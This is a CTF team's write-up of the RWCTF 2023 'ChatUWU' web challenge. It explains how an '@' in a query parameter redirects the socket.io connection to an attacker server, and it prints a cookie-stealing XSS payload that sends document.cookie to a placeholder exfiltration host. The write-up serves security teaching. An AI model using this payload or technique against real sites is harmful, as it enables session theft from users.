@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>ChatUWU | Organisers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="ChatUWU" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF Team" />
+<meta property="og:description" content="CTF Team" />
+<link rel="canonical" href="https://org.anize.rs/rwctf-2023/web/chatuwu.html" />
+<meta property="og:url" content="https://org.anize.rs/rwctf-2023/web/chatuwu.html" />
+<meta property="og:site_name" content="Organisers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="ChatUWU" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"ChatUWU","url":"https://org.anize.rs/rwctf-2023/web/chatuwu.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
+    <meta name="twitter:card" content="summary" />
+    <!-- TODO <meta name="twitter:description" content="" /> -->
+    <meta name="twitter:title" content="Organisers" />
+    <meta name="twitter:site" content="@0rganizers" />
+    <!-- TODO <meta name="twitter:image" content="" /> -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#040d21">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Hack monospace font -->
+    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+
+    <!-- legitimize current Mastodon profile via link verification -->
+    <link rel="me" href="https://infosec.exchange/@organizers" />
+
+
+    <script type="text/javascript">
+        function isLightThemeSelected() {
+          return document.cookie.match(/theme=light/i) != null
+        }
+
+        function setThemeFromCookie() {
+            var html = document.getElementsByTagName('html')[0]
+            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
+            console.log('Loaded cookie: ' + document.cookie)
+        }
+
+        (function() {
+          setThemeFromCookie()
+        })();
+    </script>
+
+    <script type="text/javascript">
+        function getFootnoteContent(linkId) {
+            const fnId = linkId.replace(/^fnref/, 'fn');
+            return document.getElementById(fnId).querySelector("p").innerHTML;
+        }
+
+        function addFootnote(element, content) {
+            const footnote = document.createElement('div');
+            footnote.classList.add('footnote-box');
+            // Also add the footnote number
+            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
+            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
+                footnote.removeChild(backlink);
+            });
+            element.insertAdjacentElement('afterend', footnote);
+            element.dataset.toggled = '1';
+        }
+
+        function removeFootnote(element) {
+            element.parentElement.removeChild(element.nextSibling);
+            element.dataset.toggled = '0';
+        }
+
+
+        window.addEventListener("load", function() {
+            document.querySelectorAll("a.footnote").forEach((el) => {
+                const sup = el.parentElement;
+                el.addEventListener("click", (event) => {
+                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
+                    if (!isOpen) {
+                        addFootnote(sup, getFootnoteContent(sup.id));
+                    } else {
+                        removeFootnote(sup);
+                    }
+                    event.preventDefault();
+                });
+            });
+        });
+    </script>
+
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      "HTML-CSS": {
+        fonts: ["Gyre-Pagella"],
+        imageFont: null,
+        undefinedFamily: "'Arial Unicode MS', cmbright"
+      },
+      tex2jax: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        processEscapes: true
+      }
+    });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
+  </head>
+  
+  <body> 
+    <header class="page-header-simple" role="banner">
+      
+      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
+      <div class="right-links">
+        <a href="/writeups">Writeups</a>
+        <a href="/achievements">Achievements</a>
+      </div>
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="chatuwu">ChatUWU</h1>
+
+<blockquote>
+  <p>difficulty: Normal
+I can assure you that there is no XSS on the server! You will find the flag in admin’s cookie. 
+Challenge: http://47.254.28.30:58000/ XSS Bot: http://47.254.28.30:13337/ attachment</p>
+</blockquote>
+
+<p>The attachment gives us the <code class="language-plaintext highlighter-rouge">index.js</code> that is running on the backend. The challenge description tells us there is an XSS Bot running and looking at that link we see that we can send the bot to a url as long as it is on the challenge server. The main challenge url leads to a website that has a chat room. Looking at the source, we see that there are different chatrooms and one of them is handled differently:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">/socket.io/socket.io.js</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span>
+<span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
+    <span class="kd">function</span> <span class="nx">reset</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s2">`?nickname=guest</span><span class="p">${</span><span class="nb">String</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()).</span><span class="nx">substr</span><span class="p">(</span><span class="o">-</span><span class="mi">4</span><span class="p">)}</span><span class="s2">&amp;room=textContent`</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="kd">let</span> <span class="nx">query</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">URLSearchParams</span><span class="p">(</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">),</span>
+        <span class="nx">nickname</span> <span class="o">=</span> <span class="nx">query</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">nickname</span><span class="dl">'</span><span class="p">),</span>
+        <span class="nx">room</span> <span class="o">=</span> <span class="nx">query</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">room</span><span class="dl">'</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">nickname</span> <span class="o">||</span> <span class="o">!</span><span class="nx">room</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">reset</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">k</span> <span class="k">of</span> <span class="nx">query</span><span class="p">.</span><span class="nx">keys</span><span class="p">())</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">[</span><span class="dl">'</span><span class="s1">nickname</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">room</span><span class="dl">'</span><span class="p">].</span><span class="nx">includes</span><span class="p">(</span><span class="nx">k</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nx">reset</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">title</span> <span class="o">+=</span> <span class="dl">'</span><span class="s1"> - </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">room</span><span class="p">;</span>
+    <span class="kd">let</span> <span class="nx">socket</span> <span class="o">=</span> <span class="nx">io</span><span class="p">(</span><span class="s2">`/</span><span class="p">${</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">}</span><span class="s2">`</span><span class="p">),</span>
+        <span class="nx">messages</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">messages</span><span class="dl">'</span><span class="p">),</span>
+        <span class="nx">form</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">form</span><span class="dl">'</span><span class="p">),</span>
+        <span class="nx">input</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">'</span><span class="s1">input</span><span class="dl">'</span><span class="p">);</span>
+
+    <span class="nx">form</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="dl">'</span><span class="s1">submit</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">e</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">();</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">input</span><span class="p">.</span><span class="nx">value</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">socket</span><span class="p">.</span><span class="nx">emit</span><span class="p">(</span><span class="dl">'</span><span class="s1">msg</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span><span class="na">from</span><span class="p">:</span> <span class="nx">nickname</span><span class="p">,</span> <span class="na">text</span><span class="p">:</span> <span class="nx">input</span><span class="p">.</span><span class="nx">value</span><span class="p">});</span>
+            <span class="nx">input</span><span class="p">.</span><span class="nx">value</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">});</span>
+
+    <span class="nx">socket</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">msg</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">msg</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">let</span> <span class="nx">item</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">li</span><span class="dl">'</span><span class="p">),</span>
+            <span class="nx">msgtext</span> <span class="o">=</span> <span class="s2">`[</span><span class="p">${</span><span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">toLocaleTimeString</span><span class="p">()}</span><span class="s2">] </span><span class="p">${</span><span class="nx">msg</span><span class="p">.</span><span class="k">from</span><span class="p">}</span><span class="s2">: </span><span class="p">${</span><span class="nx">msg</span><span class="p">.</span><span class="nx">text</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
+        <span class="nx">room</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">DOMPurify</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">isHtml</span> <span class="p">?</span> <span class="nx">item</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">msgtext</span> <span class="p">:</span> <span class="nx">item</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">msgtext</span><span class="p">;</span>
+        <span class="nx">messages</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">item</span><span class="p">);</span>
+        <span class="nb">window</span><span class="p">.</span><span class="nx">scrollTo</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">scrollHeight</span><span class="p">);</span>
+    <span class="p">});</span>
+
+    <span class="nx">socket</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">error</span><span class="dl">'</span><span class="p">,</span> <span class="nx">msg</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="nx">alert</span><span class="p">(</span><span class="nx">msg</span><span class="p">);</span>
+        <span class="nx">reset</span><span class="p">();</span>
+    <span class="p">});</span>
+<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span></code></pre></div></div>
+
+<p>Specifically, if we set the get parameter <code class="language-plaintext highlighter-rouge">room</code> in the url to <code class="language-plaintext highlighter-rouge">DOMPurify</code>, it will be assigning the messages to <code class="language-plaintext highlighter-rouge">innerHTML</code> instead of <code class="language-plaintext highlighter-rouge">textContent</code>. That would allow easy XSS in any message we send in the chat - except that it also has to be <code class="language-plaintext highlighter-rouge">msg.isHtml</code>, and that information comes from the server.</p>
+
+<p>The relevant part of the server code: The message and nickname are truncated and <em>then</em> purified, so the truncation itself does not allow us to inject anything that DOMPurify would normally catch.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">socket</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">'</span><span class="s1">msg</span><span class="dl">'</span><span class="p">,</span> <span class="nx">msg</span> <span class="o">=&gt;</span> <span class="p">{</span>
+        <span class="nx">msg</span><span class="p">.</span><span class="k">from</span> <span class="o">=</span> <span class="nb">String</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="k">from</span><span class="p">).</span><span class="nx">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span>
+        <span class="nx">msg</span><span class="p">.</span><span class="nx">text</span> <span class="o">=</span> <span class="nb">String</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">text</span><span class="p">).</span><span class="nx">substr</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">140</span><span class="p">)</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">room</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">DOMPurify</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">io</span><span class="p">.</span><span class="nx">to</span><span class="p">(</span><span class="nx">room</span><span class="p">).</span><span class="nx">emit</span><span class="p">(</span><span class="dl">'</span><span class="s1">msg</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
+                <span class="na">from</span><span class="p">:</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nx">sanitize</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="k">from</span><span class="p">),</span>
+                <span class="na">text</span><span class="p">:</span> <span class="nx">DOMPurify</span><span class="p">.</span><span class="nx">sanitize</span><span class="p">(</span><span class="nx">msg</span><span class="p">.</span><span class="nx">text</span><span class="p">),</span>
+                <span class="na">isHtml</span><span class="p">:</span> <span class="kc">true</span>
+            <span class="p">});</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nx">io</span><span class="p">.</span><span class="nx">to</span><span class="p">(</span><span class="nx">room</span><span class="p">).</span><span class="nx">emit</span><span class="p">(</span><span class="dl">'</span><span class="s1">msg</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
+                <span class="na">from</span><span class="p">:</span> <span class="nx">msg</span><span class="p">.</span><span class="k">from</span><span class="p">,</span>
+                <span class="na">text</span><span class="p">:</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">text</span><span class="p">,</span>
+                <span class="na">isHtml</span><span class="p">:</span> <span class="kc">false</span>
+            <span class="p">});</span>
+        <span class="p">}</span>
+    <span class="p">});</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">from</code> and <code class="language-plaintext highlighter-rouge">text</code> are independently sanitized, and then in the frontend joined together:</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msgtext</span> <span class="o">=</span> <span class="s2">`[</span><span class="p">${</span><span class="k">new</span> <span class="nb">Date</span><span class="p">().</span><span class="nx">toLocaleTimeString</span><span class="p">()}</span><span class="s2">] </span><span class="p">${</span><span class="nx">msg</span><span class="p">.</span><span class="k">from</span><span class="p">}</span><span class="s2">: </span><span class="p">${</span><span class="nx">msg</span><span class="p">.</span><span class="nx">text</span><span class="p">}</span><span class="s2">`</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>So we thought we might be able to inject half of the javascript we want to inject into the nickname and hals into the message text, and hoped that DOMPurify would let us get away with it. It did not.</p>
+
+<p>In the meantime, people started doing shenanigans on the website, but it seems most of it was just affecting the styling and not executing code. Animated text runs over the screen saying <code class="language-plaintext highlighter-rouge">WOW!</code>, amongus unicode characters <code class="language-plaintext highlighter-rouge">ඞ</code> are being spammed, fake flags are being posted by users who changed their name to <code class="language-plaintext highlighter-rouge">system</code>, porn appears, all the text goes blank, and the website starts flashing in red and black.</p>
+
+<p>We noticed an inconsistency: <code class="language-plaintext highlighter-rouge">http://0.0.0.0:58000/?&amp;room=DOMPurify&amp;nickname=guest1369&amp;room=textContent</code> will connect to room <code class="language-plaintext highlighter-rouge">textContent</code> but <code class="language-plaintext highlighter-rouge">query.get("room")</code> will return <code class="language-plaintext highlighter-rouge">DOMPurify</code>, and that is then used to set the <code class="language-plaintext highlighter-rouge">room</code>.
+But there is still the <code class="language-plaintext highlighter-rouge">msg.isHtml</code> check :(</p>
+
+<p>Dreaming a little bit: We could perhaps make the XSS Bot connect to a socket on a different domain instead. If we were to control what the socket sends to the client, we could make it send <code class="language-plaintext highlighter-rouge">isHtml</code> without being purified.</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="kd">let</span> <span class="nx">socket</span> <span class="o">=</span> <span class="nx">io</span><span class="p">(</span><span class="s2">`/</span><span class="p">${</span><span class="nx">location</span><span class="p">.</span><span class="nx">search</span><span class="p">}</span><span class="s2">`</span><span class="p">),</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">location.search</code> is everything in the url starting from the question mark. Above line prefixes it with a slash, so normally this refers to the root of the current domain. If we could somehow make <code class="language-plaintext highlighter-rouge">socket.io</code> ignore the starting <code class="language-plaintext highlighter-rouge">/?</code>, we could give it our own server’s address, and then we could control what the bot receives from the server.</p>
+
+<p>We achieve this by having an <code class="language-plaintext highlighter-rouge">@</code> in our parameter. Apparently, everything before the <code class="language-plaintext highlighter-rouge">@</code> is considered to be the username on the domain. <code class="language-plaintext highlighter-rouge">http://127.0.0.1:58000/?nickname=@example.com/&amp;room=DOMPurify</code> is parsed as the domain <code class="language-plaintext highlighter-rouge">example.com/&amp;room=DOMPurify</code> for the socket connection. At the same time, the get parameter <code class="language-plaintext highlighter-rouge">room=DOMPurify</code> allows us to still get into the <code class="language-plaintext highlighter-rouge">innerHTML</code> region in the client-side line of code</p>
+
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">room</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">DOMPurify</span><span class="dl">'</span> <span class="o">&amp;&amp;</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">isHtml</span> <span class="p">?</span> <span class="nx">item</span><span class="p">.</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="nx">msgtext</span> <span class="p">:</span> <span class="nx">item</span><span class="p">.</span><span class="nx">textContent</span> <span class="o">=</span> <span class="nx">msgtext</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p>We can now launch an exploit server that will respond to the socket connection, and send the XSS payload via the socket connection. To achieve that, we can simply:</p>
+<ul>
+  <li>take the webserver code</li>
+  <li>add these lines to accept connection cross-domain:
+    <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">io</span><span class="p">.</span><span class="nx">engine</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="dl">"</span><span class="s2">headers</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">headers</span><span class="p">,</span> <span class="nx">req</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+<span class="nx">headers</span><span class="p">[</span><span class="dl">"</span><span class="s2">Access-Control-Allow-Origin</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">*</span><span class="dl">"</span><span class="p">;</span>
+<span class="p">});</span>
+</code></pre></div>    </div>
+  </li>
+  <li>remove the sanitazation of the message:
+    <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>          <span class="nx">io</span><span class="p">.</span><span class="nx">to</span><span class="p">(</span><span class="nx">room</span><span class="p">).</span><span class="nx">emit</span><span class="p">(</span><span class="dl">'</span><span class="s1">msg</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
+              <span class="na">from</span><span class="p">:</span> <span class="nx">msg</span><span class="p">.</span><span class="k">from</span><span class="p">,</span>
+              <span class="na">text</span><span class="p">:</span> <span class="nx">msg</span><span class="p">.</span><span class="nx">text</span><span class="p">,</span>
+              <span class="na">isHtml</span><span class="p">:</span> <span class="kc">true</span>
+          <span class="p">});</span>
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>Next step is to send the malicious URL to the bot. Our looked like this:
+<code class="language-plaintext highlighter-rouge">http://[chat_server]:58000/?nickname=x@[exploit_ip]:1231/?&amp;room=DOMPurify</code> (we’re not sure why we need to have <code class="language-plaintext highlighter-rouge">?&amp;</code> after our server hostname, but it didn’t work when we tried to tweak it differently 😅)</p>
+
+<p>Now, the bot should connect to our server from the challenge domain. Simply connect to your own server, and send an xss payload to get the cookies, such as <code class="language-plaintext highlighter-rouge">&lt;img src=x onerror="fetch('https://[exfil server]/'+btoa(document.cookie))"&gt;</code></p>
+
+<p>Doing this, we receive a request containing base64 encoded flag!</p>
+
+
+
+
+<!--       <footer class="site-footer">
+        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
+      </footer> -->
+
+      <div class="lever-meme">
+        <div id="lever" class="lever-off"></div>
+      </div>
+
+      <div class="twitter">
+        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
+      </div>
+
+      <script>
+        let leverCount = 0;
+        let manic = false;
+
+        function resetLever() {
+            leverCount = 0;
+            setTimeout(resetLever, 1750);
+        }
+
+        resetLever();
+
+        document.getElementById('lever')
+        .addEventListener('click', function (event) {
+          if(leverCount > 10){
+            manic = true;
+            document.getElementById("lever").classList.add('lever-manic');
+            document.getElementById("header-logo").classList.add('rainbow');
+          }
+
+          if(!manic){
+            document.getElementById("lever").classList.toggle('lever-on');
+            ++leverCount;
+          }
+        });
+
+
+      </script>
+
+      <script>
+      function updateThemeToggleFooter() {
+        let elem = document.querySelector('#lever');
+        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
+      }
+
+      (function() {
+        updateThemeToggleFooter()
+      })();
+
+      function togglePageContentLightDark() {
+          var html = document.getElementsByTagName('html')[0]
+          var currentClass = html.className
+          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
+          html.className = newClass
+
+          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
+          console.log('Cookies are now: ' + document.cookie)
+
+          updateThemeToggleFooter()
+      }
+
+      const btn = document.querySelector("#lever");
+      btn.addEventListener("click", function() {
+        togglePageContentLightDark();
+      });
+      </script>
+    </main>
+  </body>
+</html>
